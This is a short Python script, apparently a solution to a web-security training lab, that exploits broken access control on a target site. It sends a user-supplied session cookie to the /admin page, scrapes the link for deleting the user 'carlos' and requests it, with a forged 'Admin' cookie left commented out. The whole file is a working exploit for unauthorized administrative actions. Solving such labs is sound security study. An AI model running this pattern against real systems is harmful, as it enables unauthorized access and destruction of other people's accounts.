import re
from urllib.parse import urljoin
import requests

url_base = input("Enter url home page: ")
session_id = input("Enter your session id: ")
url_login = urljoin(url_base, "login")
url_admin = urljoin(url_base, "admin")

payload = {'username': 'wiener', 'password': 'peter'}

cookies = {
    # 'Admin': 'True',
    'session': session_id
}

response = requests.get(url=url_admin, cookies=cookies)

match = re.search(r'href="(/admin/delete\?username=carlos)"', response.text)
if match:
    delete_path = match.group(1)
    delete_url = url_base.rstrip('/') + delete_path
    response = requests.get(delete_url, cookies=cookies)
    print(response.status_code)
